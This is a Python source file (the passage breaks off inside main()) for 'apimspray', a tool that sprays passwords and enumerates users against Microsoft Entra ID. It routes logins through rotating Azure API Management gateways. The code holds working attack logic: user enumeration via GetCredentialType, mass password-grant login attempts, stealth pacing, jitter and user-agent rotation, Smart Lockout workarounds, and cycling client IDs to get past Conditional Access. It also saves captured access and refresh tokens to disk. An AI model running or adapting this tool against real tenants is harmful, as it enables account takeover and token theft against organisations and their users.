#!/usr/bin/env python3
"""
apimspray - Entra ID Auth Assessment Toolkit via APIM Gateways
"""

import argparse
import os
import sys
import time
import uuid
import random
import threading
import json
import re
import requests
import itertools
import subprocess
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from urllib.parse import urlparse

# --- Configuration & Constants ---

VERSION = "2.0.0"

# Terminal Colors
USE_COLOR = sys.stdout.isatty() and not os.getenv("NO_COLOR")

class TermColors:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"

# Pacing configurations
PACE_SETTINGS = {
    "high": {"workers": 15, "delay": 0.1, "count": 10, "lockout": 5, "safe": 20, "jitter": 0},
    "medium": {"workers": 5, "delay": 1, "count": 5, "lockout": 10, "safe": 10, "jitter": 10},
    "low": {"workers": 2, "delay": 5, "count": 2, "lockout": 15, "safe": 5, "jitter": 20},
    "stealth": {"workers": 1, "delay": 30, "count": 1, "lockout": 20, "safe": 1, "jitter": 40},
    "stealth-multi": {"workers": 5, "delay": 30, "count": 1, "lockout": 20, "safe": 1, "jitter": 40},
}
PACE_SETTINGS["mid"] = PACE_SETTINGS["medium"]  # alias

# Smart Lockout
LOCKOUT_WAIT_SECONDS = 65
SMART_LOCKOUT_ERROR = "AADSTS50053"
USER_NOT_FOUND_ERROR = "AADSTS50034"

# User enumeration via GetCredentialType (unauthenticated: no password sent,
# so it never counts toward Smart Lockout). IfExistsResult meaning:
#   0/5/6 -> account exists, 1 -> does not exist, other -> unknown.
GETCREDTYPE_PATH = "common/GetCredentialType"
IF_EXISTS_EXISTS = (0, 5, 6)
IF_EXISTS_ABSENT = (1,)

# User Agents (Windows 11)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]

# Client Apps (ClientId, Resource, Scope)
# Sourced from common research (o365spray, etc)
CLIENT_APPS = [
    # Microsoft Office
    {
        "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        "resource": "https://graph.microsoft.com",
        "scope": "openid profile offline_access"
    },
    # Azure AD PowerShell
    {
        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
        "resource": "https://graph.windows.net",
        "scope": "openid profile"
    },
    # Office 365 Exchange Online
    # {
    #     "client_id": "00000002-0000-0ff1-ce00-000000000000",
    #     "resource": "https://outlook.office365.com",
    #     "scope": "openid profile"
    # },
    # Microsoft Teams
    {
        "client_id": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
        "resource": "https://graph.microsoft.com",
        "scope": "openid profile"
    }
]

DEFAULT_RESOURCE = "https://graph.microsoft.com"
DEFAULT_SCOPE = "openid profile offline_access"

def resolve_client_apps(client_id, resource, scope):
    """
    Returns the list of client apps to draw from per request.
    Without --client-id: the full built-in list (randomized per attempt).
    With --client-id: exactly one app. A known GUID reuses its resource/scope;
    an unknown one falls back to Graph defaults. --resource/--scope override either.
    """
    if not client_id:
        return list(CLIENT_APPS)

    app = None
    for known in CLIENT_APPS:
        if known["client_id"].lower() == client_id.lower():
            app = dict(known)
            break
    if app is None:
        app = {"client_id": client_id, "resource": DEFAULT_RESOURCE, "scope": DEFAULT_SCOPE}
    if resource:
        app["resource"] = resource
    if scope:
        app["scope"] = scope
    return [app]

def build_client_apps_from_ids(client_ids, resource, scope):
    """Builds one app config per client_id (for validate-clients iteration)."""
    apps = []
    for cid in client_ids:
        apps.extend(resolve_client_apps(cid, resource, scope))
    return apps

# AADSTS Codes
AADSTS_REGEX = re.compile(r'(AADSTS\d+)')
AADSTS_MAP = {
    "AADSTS50053": "LOCKED (Smart Lockout)",
    "AADSTS50055": "VALID (Password Expired)",
    "AADSTS50057": "BLOCKED (Account Disabled)",
    "AADSTS50126": "FAILED (Invalid Creds)",
    "AADSTS50034": "FAILED (User Not Found)",
    "AADSTS50059": "FAILED (Tenant Not Found)",
    "AADSTS50128": "FAILED (Invalid Domain)",
    "AADSTS50076": "VALID (MFA Required)",
    "AADSTS50079": "VALID (MFA Required)",
    "AADSTS50158": "VALID (Conditional Access)",
    "AADSTS53003": "VALID (Conditional Access Blocked)",
    "AADSTS53000": "BLOCKED (Policy)",
    "AADSTS50105": "BLOCKED (Not Assigned)",
    "AADSTS500011": "VALID (Invalid Resource)",
    "AADSTS700016": "VALID (Invalid ClientID)",
    "AADSTS50000": "ERROR (Token Issue)",
}

# --- Classes ---

class Target:
    def __init__(self, username, password=None, client_app=None):
        self.username = username
        self.password = password
        # When set, forces this specific client app (validate-clients mode).
        self.client_app = client_app

class APIMManager:
    def __init__(self, urls):
        self.urls = urls
        self.lock = threading.Lock()
        self._pool = []
        self._last_url = None

    def get_next_url(self):
        """Returns the next APIM URL, cycling through a shuffled pool."""
        with self.lock:
            if not self.urls:
                raise ValueError("No APIM URLs available.")
            if len(self.urls) == 1:
                return self.urls[0]
            if not self._pool:
                self._pool = list(self.urls)
                random.shuffle(self._pool)
                if self._last_url and self._pool[0] == self._last_url and len(self._pool) > 1:
                    # Avoid immediate repeats when refilling the pool.
                    self._pool[0], self._pool[1] = self._pool[1], self._pool[0]
            next_url = self._pool.pop(0)
            self._last_url = next_url
            return next_url

class Logger:
    """
    Per-run output. Layout:
        <output>/<date>_<time>_<mode>/
            manifest.json    run metadata
            results.jsonl    one JSON object per attempt (source of truth)
            valid.txt        human-friendly view of the interesting hits
            tokens.jsonl     captured OAuth tokens
        <output>/latest -> most recent run dir (best effort)
    """
    def __init__(self, output_dir, mode):
        self.output_dir = Path(output_dir)
        self.mode = mode

        stamp = datetime.now(timezone.utc).strftime("%Y-%m-%d_%H%M")
        base = f"{stamp}_{mode}"
        run_dir = self.output_dir / base
        n = 2
        while run_dir.exists():  # avoid clobbering a run from the same minute
            run_dir = self.output_dir / f"{base}_{n}"
            n += 1
        self.run_dir = run_dir
        self.run_dir.mkdir(parents=True, exist_ok=True)

        self.results_file = self.run_dir / "results.jsonl"
        self.valid_file = self.run_dir / "valid.txt"
        self.tokens_file = self.run_dir / "tokens.jsonl"
        self.manifest_file = self.run_dir / "manifest.json"

        self._results_lock = threading.Lock()
        self._valid_lock = threading.Lock()
        self._tokens_lock = threading.Lock()

        self._update_latest_symlink()

    def _update_latest_symlink(self):
        link = self.output_dir / "latest"
        try:
            if link.is_symlink() or link.exists():
                link.unlink()
            link.symlink_to(self.run_dir.name)
        except OSError:
            # Some filesystems (e.g. Windows drvfs) do not support symlinks.
            pass

    def record(self, data, console_message=None, valid_view=None):
        """Appends one structured attempt to results.jsonl (+ optional views)."""
        data.setdefault("mode", self.mode)
        if console_message:
            print(console_message)
        line = json.dumps(data)
        with self._results_lock:
            with open(self.results_file, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        if valid_view:
            with self._valid_lock:
                with open(self.valid_file, "a", encoding="utf-8") as f:
                    f.write(valid_view + "\n")

    def log_token(self, record):
        """Appends a captured token record as one JSON line."""
        with self._tokens_lock:
            with open(self.tokens_file, "a", encoding="utf-8") as f:
                f.write(json.dumps(record) + "\n")

    def write_manifest(self, data):
        with open(self.manifest_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)

# --- Helper Functions ---

def style(text, *styles):
    if not USE_COLOR or not styles:
        return text
    return f"{''.join(styles)}{text}{TermColors.RESET}"

def utc_now_str():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

def print_info(message):
    prefix = style("[*]", TermColors.CYAN, TermColors.BOLD)
    print(f"{prefix} {message}")

def print_warn(message):
    prefix = style("[!]", TermColors.YELLOW, TermColors.BOLD)
    print(f"{prefix} {message}")

def print_success(message):
    prefix = style("[+]", TermColors.GREEN, TermColors.BOLD)
    print(f"{prefix} {message}")

def print_error(message):
    prefix = style("[x]", TermColors.RED, TermColors.BOLD)
    print(f"{prefix} {message}")

def format_result_line(timestamp, target, classification):
    ts = style(f"[{timestamp}]", TermColors.DIM)
    creds = f"{target.username}:{target.password}"

    if classification.startswith("VALID"):
        creds = style(creds, TermColors.GREEN, TermColors.BOLD)
        status = style(classification, TermColors.GREEN, TermColors.BOLD)
    elif classification.startswith("LOCKED") or classification.startswith("BLOCKED"):
        creds = style(creds, TermColors.YELLOW, TermColors.BOLD)
        status = style(classification, TermColors.YELLOW, TermColors.BOLD)
    elif classification.startswith("FAILED"):
        creds = style(creds, TermColors.RED)
        status = style(classification, TermColors.RED)
    else:
        status = style(classification, TermColors.MAGENTA)

    return f"{ts} {creds} | {status}"

def wait_with_countdown(seconds, allow_skip):
    if seconds <= 0:
        return False

    skip_event = threading.Event()
    if allow_skip and sys.stdin.isatty():
        t = threading.Thread(target=_wait_for_enter, args=(skip_event,), daemon=True)
        t.start()

    if not sys.stdout.isatty():
        time.sleep(seconds)
        return skip_event.is_set()

    for remaining in range(seconds, 0, -1):
        line = f"    Waiting {remaining}s to retry"
        if allow_skip and sys.stdin.isatty():
            line += " (press Enter to skip)"
        print(f"\r{line}", end="", flush=True)
        if skip_event.is_set():
            break
        time.sleep(1)

    print("\033[2K\r", end="", flush=True)
    print()
    return skip_event.is_set()

def _wait_for_enter(event):
    try:
        sys.stdin.readline()
    except Exception:
        return
    event.set()

def load_file_lines(path):
    p = Path(path)
    if not p.exists():
        return []
    with open(p, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def get_tested_users_from_dir(results_dir):
    """Reads a previous run's results.jsonl and returns the set of tested users."""
    tested = set()
    dir_path = Path(results_dir)
    # Accept either the run directory or the results.jsonl file directly.
    if dir_path.is_dir():
        results_file = dir_path / "results.jsonl"
    else:
        results_file = dir_path
    if not results_file.exists():
        print_warn(f"Resume results file not found: {results_file}")
        return tested

    with open(results_file, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                row = json.loads(line)
            except json.JSONDecodeError:
                continue
            user = row.get("username")
            if user:
                tested.add(user.strip())
    return tested

def normalize_users(users, domain):
    normalized = []
    for u in users:
        if "@" in u:
            # If domain is forced, replace it? The prompt says:
            # "wenn --domain enthalten soll die Domain aus der users.txt ausgebledet werden und die Domain die in --domain gegeben ist soll gewinnen"
            if domain:
                user_part = u.split("@")[0]
                normalized.append(f"{user_part}@{domain}")
            else:
                normalized.append(u)
        else:
            if domain:
                normalized.append(f"{u}@{domain}")
            else:
                # User has no domain and no domain arg provided. 
                # We'll keep it as is, but it might fail.
                normalized.append(u)
    return normalized

def parse_aadsts(text):
    match = AADSTS_REGEX.search(text)
    if match:
        return match.group(1)
    try:
        payload = json.loads(text)
    except json.JSONDecodeError:
        return None

    if isinstance(payload, dict):
        codes = payload.get("error_codes") or payload.get("errorCodes") or []
        if isinstance(codes, list) and codes:
            return f"AADSTS{codes[0]}"
        description = payload.get("error_description", "")
        match = AADSTS_REGEX.search(description)
        if match:
            return match.group(1)
    return None

def get_status_from_aadsts(code):
    return AADSTS_MAP.get(code, "UNKNOWN")

def has_access_token(text):
    try:
        payload = json.loads(text)
    except json.JSONDecodeError:
        # A genuine token response is always JSON; a non-JSON body that merely
        # mentions the string (e.g. an error page) is not a valid credential.
        return False
    return isinstance(payload, dict) and "access_token" in payload

def build_attempt_record(target, aadsts, classification, app_config, gateway_url, status_code=None, has_token=False):
    """Structured record for one auth attempt, written to results.jsonl."""
    return {
        "ts": utc_now_str(),
        "username": target.username,
        "password": target.password,
        "classification": classification,
        "aadsts": aadsts,
        "client_id": app_config["client_id"] if app_config else None,
        "resource": app_config["resource"] if app_config else None,
        "gateway": urlparse(gateway_url).netloc,
        "http_status": status_code,
        "has_token": has_token,
    }

def build_token_record(target, app_config, gateway_url, response_text):
    """Builds a JSON-serializable record for a captured token response."""
    try:
        payload = json.loads(response_text)
    except json.JSONDecodeError:
        payload = {}
    if not isinstance(payload, dict):
        payload = {}
    return {
        "timestamp": utc_now_str(),
        "username": target.username,
        "password": target.password,
        "client_id": app_config["client_id"],
        "resource": app_config["resource"],
        "gateway": urlparse(gateway_url).netloc,
        "token_type": payload.get("token_type"),
        "scope": payload.get("scope"),
        "expires_on": payload.get("expires_on"),
        "resource_returned": payload.get("resource"),
        "access_token": payload.get("access_token"),
        "refresh_token": payload.get("refresh_token"),
        "id_token": payload.get("id_token"),
    }

# --- Core Logic ---

def perform_auth(target, gateway_url, tenant, app_config, proxy_dict=None):
    """
    Performs a single authentication attempt via APIM.
    Returns (status_code, response_text, aadsts_code)
    """
    
    # Construct the token endpoint against the APIM base URL.
    # Path segment is the tenant (default "common"); the APIM operation must be
    # defined as a prefix/wildcard match for a non-"common" tenant to route.
    if not gateway_url.endswith("/"):
        gateway_url += "/"

    tenant_segment = (tenant or "common").strip("/")
    full_url = f"{gateway_url}{tenant_segment}/oauth2/token"

    # Headers
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "client-request-id": str(uuid.uuid4()),
        "return-client-request-id": "true"
    }

    # Body
    data = {
        "grant_type": "password",
        "resource": app_config["resource"],
        "client_id": app_config["client_id"],
        "scope": app_config["scope"],
        "username": target.username,
        "password": target.password
    }

    try:
        # Request - Timeout strictly enforced
        resp = requests.post(full_url, headers=headers, data=data, timeout=15, verify=True)
        return resp.status_code, resp.text, parse_aadsts(resp.text)
    except requests.RequestException as e:
        return 0, str(e), None

def check_user_exists(username, gateway_url):
    """
    Enumerates a single user via GetCredentialType through APIM.
    No password is submitted, so this cannot trigger Smart Lockout.
    Returns (status_code, response_text).
    """
    if not gateway_url.endswith("/"):
        gateway_url += "/"
    full_url = f"{gateway_url}{GETCREDTYPE_PATH}"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/json; charset=UTF-8",
        "Accept": "application/json",
        "client-request-id": str(uuid.uuid4()),
    }
    body = {
        "Username": username,
        "isOtherIdpSupported": True,
    }

    try:
        resp = requests.post(full_url, headers=headers, json=body, timeout=15, verify=True)
        return resp.status_code, resp.text
    except requests.RequestException as e:
        return 0, str(e)

def classify_cred_type(text):
    """
    Parses a GetCredentialType response.
    Returns (classification, throttled) where classification is
    "EXISTS" / "NOT_EXIST" / "UNKNOWN" and throttled is a bool.
    """
    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        return "UNKNOWN", False
    if not isinstance(data, dict):
        return "UNKNOWN", False

    throttled = bool(data.get("ThrottleStatus", 0))
    if_exists = data.get("IfExistsResult")
    if if_exists in IF_EXISTS_EXISTS:
        return "EXISTS", throttled
    if if_exists in IF_EXISTS_ABSENT:
        return "NOT_EXIST", throttled
    return "UNKNOWN", throttled

def process_enum(target, apim_manager, pace_config, logger, existing_set, throttle_flag, lock, stop_event):
    """
    Worker: enumerate one user via GetCredentialType. No lockout accounting.
    """
    if stop_event.is_set():
        return

    # Pace/jitter for rate control (mirrors process_attempt).
    base_delay = pace_config["delay"]
    current_delay = base_delay
    if pace_config["jitter"] > 0 and base_delay > 0:
        jitter_val = (base_delay * pace_config["jitter"]) / 100.0
        current_delay += random.uniform(-jitter_val, jitter_val)
        current_delay = max(0, current_delay)
    if current_delay > 0:
        time.sleep(current_delay)

    gateway_url = apim_manager.get_next_url()
    status_code, response_text = check_user_exists(target.username, gateway_url)
    classification, throttled = classify_cred_type(response_text)

    if throttled and not throttle_flag.is_set():
        throttle_flag.set()
        print_warn("GetCredentialType is throttled (ThrottleStatus set). Results may be unreliable; slow the pace.")

    gateway_host = urlparse(gateway_url).netloc
    timestamp = utc_now_str()

    record = {
        "ts": timestamp,
        "username": target.username,
        "classification": classification,
        "gateway": gateway_host,
        "http_status": status_code,
        "throttled": throttled,
    }
    if classification == "EXISTS":
        with lock:
            existing_set.add(target.username)
        console_msg = f"{style(f'[{timestamp}]', TermColors.DIM)} {style(target.username, TermColors.GREEN, TermColors.BOLD)} | {style('EXISTS', TermColors.GREEN, TermColors.BOLD)}"
        logger.record(record, console_message=console_msg, valid_view=target.username)
    else:
        logger.record(record)

def process_attempt(
    target,
    apim_manager,
    tenant,
    client_apps,
    pace_config,
    logger,
    locked_users_set,
    invalid_users_set,
    lockout_counts,
    lock,
    continue_on_success,
    stop_event,
):
    """
    Worker function to process a single login attempt.
    Handles retry logic for Smart Lockout.
    """
    if stop_event.is_set():
        return
    
    # Check if user is globally locked or invalid
    with lock:
        if target.username in locked_users_set or target.username in invalid_users_set:
            return

    # Apply delay per-worker
    base_delay = pace_config["delay"]
    current_delay = base_delay
    if pace_config["jitter"] > 0 and base_delay > 0:
        jitter_val = (base_delay * pace_config["jitter"]) / 100.0
        current_delay += random.uniform(-jitter_val, jitter_val)
        current_delay = max(0, current_delay)

    if current_delay > 0:
        time.sleep(current_delay)

    # Per-target client (validate-clients) wins; otherwise pick from the pool.
    app_config = target.client_app or random.choice(client_apps)

    # Get APIM URL
    gateway_url = apim_manager.get_next_url()

    # Attempt
    status_code, response_text, aadsts = perform_auth(target, gateway_url, tenant, app_config)

    # Handle User Not Found (50034)
    if aadsts == USER_NOT_FOUND_ERROR:
        with lock:
            if target.username not in invalid_users_set:
                invalid_users_set.add(target.username)
                # Single line fast-update for invalid users
                if sys.stdout.isatty():
                    print(f"\r{style('[!]', TermColors.YELLOW, TermColors.BOLD)} User Not Found: {target.username} (Total: {len(invalid_users_set)})", end="", flush=True)
                else:
                    # In non-tty, we still log or print occasionally, but here we just keep it quiet
                    pass

    # Handle Smart Lockout (50053)
    if aadsts == SMART_LOCKOUT_ERROR:
        is_slow_pace = pace_config.get("original_delay", pace_config["delay"]) >= 2
        with lock:
            lockout_counts[target.username] = lockout_counts.get(target.username, 0) + 1
            lockout_count = lockout_counts[target.username]
            
            if pace_config.get("auto_throttle"):
                current_time = time.time()
                last_throttle = pace_config.get("last_throttle_time", 0)
                if current_time - last_throttle > 10:  # Cooldown between throttles: 10s
                    old_delay = pace_config["delay"]
                    if old_delay < 15.0:
                        new_delay = min(old_delay + 1.0, 15.0)
                        pace_config["delay"] = new_delay
                        pace_config["last_throttle_time"] = current_time
                        print_warn(f"Auto-throttling triggered: Global delay increased to {new_delay:.1f}s.")

        user_display = style(target.username, TermColors.RED, TermColors.BOLD)
        classification = get_status_from_aadsts(aadsts)

        if lockout_count == 1:
            print_warn(
                f"Smart Lockout ({SMART_LOCKOUT_ERROR}) for {user_display}. "
                "Skipping wait on first occurrence."
            )
            logger.record(build_attempt_record(target, aadsts, classification, app_config, gateway_url, status_code))
            return

        if is_slow_pace:
            allow_skip = sys.stdin.isatty()
            skip_note = " Press Enter to skip." if allow_skip else ""
            print_warn(
                f"Smart Lockout ({SMART_LOCKOUT_ERROR}) for {user_display}. "
                f"Waiting {LOCKOUT_WAIT_SECONDS}s to retry.{skip_note}"
            )
            wait_with_countdown(LOCKOUT_WAIT_SECONDS, allow_skip=allow_skip)

            # Retry with the primary gateway
            gateway_url = apim_manager.get_next_url()
            status_code, response_text, aadsts = perform_auth(target, gateway_url, tenant, app_config)

            if aadsts == SMART_LOCKOUT_ERROR:
                with lock:
                    locked_users_set.add(target.username)
                classification = get_status_from_aadsts(aadsts)
                logger.record(build_attempt_record(target, aadsts, classification, app_config, gateway_url, status_code))
                return
        else:
            with lock:
                locked_users_set.add(target.username)
            print_warn(
                f"Smart Lockout ({SMART_LOCKOUT_ERROR}) for {user_display}. "
                "Skipping wait due to pace. User added to locked set."
            )
            logger.record(build_attempt_record(target, aadsts, classification, app_config, gateway_url, status_code))
            return

    # Analyze Result
    classification = "UNKNOWN"
    if aadsts:
        classification = get_status_from_aadsts(aadsts)
    elif status_code == 200 and has_access_token(response_text):
        classification = "VALID (Token)"
    elif status_code == 200:
        classification = "UNKNOWN (200 OK)"
    elif status_code == 0:
        classification = "ERROR (Request Failed)"
    else:
        classification = f"UNKNOWN (HTTP {status_code})"

    timestamp = utc_now_str()

    # Persist any token we actually obtained (ROPC success returns access_token).
    has_token = bool(status_code == 200 and has_access_token(response_text))
    if has_token:
        logger.log_token(build_token_record(target, app_config, gateway_url, response_text))

    record = build_attempt_record(target, aadsts, classification, app_config, gateway_url, status_code, has_token)

    console_msg = None
    valid_view = None
    if classification.startswith("VALID"):
        console_msg = format_result_line(timestamp, target, classification)
        valid_view = f"{target.username}:{target.password} | {classification}"
    elif classification.startswith("BLOCKED") or classification.startswith("LOCKED"):
        console_msg = format_result_line(timestamp, target, classification)
    elif classification.startswith("FAILED"):
        console_msg = format_result_line(timestamp, target, classification)

    logger.record(record, console_message=console_msg, valid_view=valid_view)

    # Global Stop Check
    is_valid_credential = classification.startswith("VALID") or classification == "BLOCKED (Account Disabled)"
    if is_valid_credential and not continue_on_success:
        print_success("Valid credentials found. Stopping as --continue-on-success is not set.")
        stop_event.set()

# --- Main ---

def main():
    parser = argparse.ArgumentParser(
        description="apimspray - Entra ID Assessment Tool",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("--urls", required=False, help="Path to APIM URLs file (from apimspraycreate.py or apimsprayrotator.sh)")
    parser.add_argument("--users", help="Path to users file")
    parser.add_argument("--passwords", help="Path to passwords file")
    parser.add_argument("--output", default="results", help="Output directory")
    parser.add_argument("--tenant", default="common", help="Tenant ID or Domain")
    parser.add_argument("--domain", help="Append domain to users if missing")
    parser.add_argument(
        "--client-id",
        help=(
            "Pin a specific client app (GUID) for every request instead of "
            "randomizing across the built-in first-party apps. If it matches a "
            "known app its resource/scope are reused; otherwise Graph defaults apply."
        ),
    )
    parser.add_argument(
        "--resource",
        help="OAuth resource to request. Overrides the client app default (use with --client-id).",
    )
    parser.add_argument(
        "--scope",
        help="OAuth scope to request. Overrides the client app default (use with --client-id).",
    )
    parser.add_argument(
        "--client-ids",
        help=(
            "For validate-clients mode: comma-separated client-app GUIDs, or a path "
            "to a file with one GUID per line. Each credential pair is tried against "
            "every client. Defaults to the built-in first-party apps if omitted."
        ),
    )
    parser.add_argument(
        "--mode",
        required=True,
        choices=["spray", "validate", "validate-users", "validate-clients"],
        help=(
            "Operation mode. 'spray' tests all passwords against all users (1:N). "
            "'validate' performs 1:1 credential pair testing. "
            "'validate-users' enumerates which users exist via GetCredentialType "
            "(no password sent, does not count toward lockout; point --urls at an "
            "enum gateway list from apimspraycreate.py --task enum). "
            "'validate-clients' is 1:1 pair testing where each pair is tried against "
            "every client ID in --client-ids (find an app not blocked by Conditional Access)."
        ),
    )
    parser.add_argument(
        "--pace",
        default="low",
        choices=["stealth", "stealth-multi", "low", "mid", "medium", "high"],
        help=(
            "Pacing profile for requests and lockout management:\n"
            " - high:          15 workers, 0.1s delay, 10 passes/chunk, 5m lockout, 20 safe threshold\n"
            " - medium:        5 workers,  1.0s delay,  5 passes/chunk, 10m lockout, 10 safe threshold, 10%% jitter\n"
            " - low:           2 workers,  5.0s delay,  2 passes/chunk, 15m lockout,  5 safe threshold, 20%% jitter\n"
            " - stealth:       1 worker,  30.0s delay,  1 pass/chunk,   20m lockout,  1 safe threshold, 40%% jitter\n"
            " - stealth-multi: 5 workers, 30.0s delay,  1 pass/chunk,   20m lockout,  1 safe threshold, 40%% jitter"
        ),
    )
    parser.add_argument(
        "--continue-on-success",
        action="store_true",
        help="Continue the assessment even after finding valid credentials.",
    )
    parser.add_argument(
        "--user-batch-size",
        type=int,
        default=0,
        help="Number of users to test before pausing (0 disables batching). Useful for wide sprays.",
    )
    parser.add_argument(
        "--user-batch-delay",
        type=str,
        default="5",
        help="Minutes to wait between user batches. Can be a range (e.g. '2-5'). Default: 5.",
    )
    parser.add_argument(
        "--shuffle-users",
        action="store_true",
        help="Randomize the order of users before spraying.",
    )
    parser.add_argument(
        "--safe-threshold",
        type=int,
        default=0,
        help="Override the pacing profile's safe lockout threshold.",
    )
    parser.add_argument(
        "--resume",
        type=str,
        help="Path to a previous results directory. Skips already tested users.",
    )
    parser.add_argument(
        "--auto-throttle",
        action="store_true",
        help="Automatically slow down the spray (increase delay) when Smart Lockouts are encountered.",
    )
    
    args = parser.parse_args()

    # Handle Missing/Empty URLs
    if not args.urls or not Path(args.urls).exists() or os.stat(args.urls).st_size == 0:
        print_warn("No URLs provided or file is empty.")
        if sys.stdin.isatty():
            try:
                choice = input("Would you like to deploy new APIM resources now? [y/N]: ").strip().lower()
                if choice in ('y', 'yes'):
                    # validate-users needs gateways exposing the GetCredentialType
                    # operation, kept in a separate list from the spray gateways.
                    is_enum = args.mode == "validate-users"
                    outfile = "urls_enum.txt" if is_enum else "urls.txt"
                    # Resolve the deployer next to this script so it works when
                    # apimspray is invoked from any working directory.
                    creator = str(Path(__file__).resolve().parent / "apimspraycreate.py")
                    create_cmd = [sys.executable, creator, "--count", "33", "--outfile", outfile]
                    if is_enum:
                        create_cmd += ["--task", "enum"]
                    print_info("Launching apimspraycreate.py...")
                    try:
                        subprocess.run(create_cmd, check=True)
                        args.urls = outfile
                    except subprocess.CalledProcessError:
                        print_error("Failed to create APIM resources.")
                        sys.exit(1)
                else:
                    print_error("Aborted by user.")
                    sys.exit(1)
            except KeyboardInterrupt:
                sys.exit(1)
        else:
            print_error("Non-interactive mode: Please provide --urls with valid file.")
            sys.exit(1)

    # Load URLs
    urls = load_file_lines(args.urls)
    if not urls:
        print_error("No URLs found in provided file.")
        sys.exit(1)
    
    apim_manager = APIMManager(urls)

    # Load Users/Pass
    users = []
    if args.users:
        users = load_file_lines(args.users)
        users = normalize_users(users, args.domain)
        
        if args.resume:
            tested = get_tested_users_from_dir(args.resume)
            if tested:
                original_len = len(users)
                users = [u for u in users if u not in tested]
                print_info(f"Resumed from {args.resume}: Skipped {original_len - len(users)} already tested users.")
        
        if args.shuffle_users:
            random.shuffle(users)
            print_info("User list randomized.")

    passwords = []
    if args.passwords:
        passwords = load_file_lines(args.passwords)
    
    # Mode Validation
    targets = []

    if args.mode == "validate":
        if not users or not passwords:
            print_error("Validate mode requires --users and --passwords")
            sys.exit(1)
        if len(users) != len(passwords):
            print_error("Validate mode requires equal number of users and passwords (1:1 mapping)")
            sys.exit(1)
        targets = [Target(u, p) for u, p in zip(users, passwords)]

    # Setup Logging
    logger = Logger(args.output, args.mode)
    print_info(f"Run dir: {style(str(logger.run_dir), TermColors.CYAN, TermColors.BOLD)}")

    # Pace Config
    pace_config = PACE_SETTINGS[args.pace].copy() # copy to allow mutation
    pace_config["original_delay"] = pace_config["delay"]
    if args.safe_threshold > 0:
        pace_config["safe"] = args.safe_threshold
    pace_config["auto_throttle"] = args.auto_throttle
    
    workers = pace_config["workers"]
    base_delay = pace_config["delay"]
    
    print_info(f"Starting apimspray")
    print_info(f"Mode: {style(args.mode, TermColors.MAGENTA, TermColors.BOLD)}")
    if args.mode == "spray":
        print_info(f"Users: {style(str(len(users)), TermColors.MAGENTA, TermColors.BOLD)}")
        print_info(f"Passwords: {style(str(len(passwords)), TermColors.MAGENTA, TermColors.BOLD)}")
    elif args.mode == "validate-users":
        print_info(f"Users: {style(str(len(users)), TermColors.MAGENTA, TermColors.BOLD)} (enumeration, no lockout)")
    elif args.mode == "validate-clients":
        print_info(f"Cred Pairs: {style(str(len(users)), TermColors.MAGENTA, TermColors.BOLD)} (x each client ID)")
    else:
        print_info(f"Targets: {style(str(len(targets)), TermColors.MAGENTA, TermColors.BOLD)}")
        
    print_info(
        f"Gateways: {style(str(len(urls)), TermColors.MAGENTA, TermColors.BOLD)} (rotating)"
    )
    print_info(
        f"Workers: {style(str(workers), TermColors.MAGENTA, TermColors.BOLD)}, "
        f"Delay: {style(f'{base_delay}s', TermColors.MAGENTA, TermColors.BOLD)}"
    )

    # Resolve client app(s) for auth attempts.
    if args.mode == "validate-clients":
        if args.client_ids:
            ids_path = Path(args.client_ids)
            if ids_path.exists():
                client_id_list = load_file_lines(args.client_ids)
            else:
                client_id_list = [c.strip() for c in args.client_ids.split(",") if c.strip()]
            if not client_id_list:
                print_error("No client IDs found in --client-ids.")
                sys.exit(1)
            client_apps = build_client_apps_from_ids(client_id_list, args.resource, args.scope)
        else:
            client_apps = list(CLIENT_APPS)
        print_info(f"Client IDs: {style(str(len(client_apps)), TermColors.MAGENTA, TermColors.BOLD)} (iterating each per pair)")
    else:
        client_apps = resolve_client_apps(args.client_id, args.resource, args.scope)
        if args.client_id:
            pinned = client_apps[0]
            print_info(
                f"Client: {style(pinned['client_id'], TermColors.MAGENTA, TermColors.BOLD)} "
                f"(resource: {pinned['resource']})"
            )
        elif args.resource or args.scope:
            print_warn("--resource/--scope are ignored without --client-id (apps are randomized).")

    # Run manifest (self-describing record of what this run was).
    manifest = {
        "started": utc_now_str(),
        "mode": args.mode,
        "tenant": args.tenant,
        "domain": args.domain,
        "pace": args.pace,
        "gateways": len(urls),
        "users": len(users),
        "passwords": len(passwords),
        "client_ids": [a["client_id"] for a in client_apps],
        "continue_on_success": args.continue_on_success,
    }
    logger.write_manifest(manifest)

    # Shared State
    locked_users_set = set()
    invalid_users_set = set()
    lockout_counts = {}
    existing_users_set = set()
    throttle_flag = threading.Event()
    lock = threading.Lock()
    stop_event = threading.Event()

    def run_assessment(target_list):
        if stop_event.is_set():
            return

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = []
            for target in target_list:
                if stop_event.is_set():
                    break
                
